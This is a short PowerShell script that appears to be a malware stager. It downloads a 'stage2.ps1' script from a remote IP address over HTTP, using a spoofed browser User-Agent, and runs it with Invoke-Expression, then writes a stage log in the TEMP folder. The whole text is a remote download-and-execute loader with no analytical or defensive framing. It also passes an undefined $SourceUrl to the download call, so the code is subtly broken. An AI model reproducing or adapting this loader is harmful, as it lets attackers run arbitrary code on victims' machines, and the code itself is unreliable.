
$RemoteUrl = "http://192.0.2.46:80/stage2.ps1"
$ConnectionTimeout = 151
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$PayloadText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $PayloadText.Length)
Invoke-Expression $PayloadText

Set-Location -Path $env:TEMP
Write-Verbose "stage marker 39 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
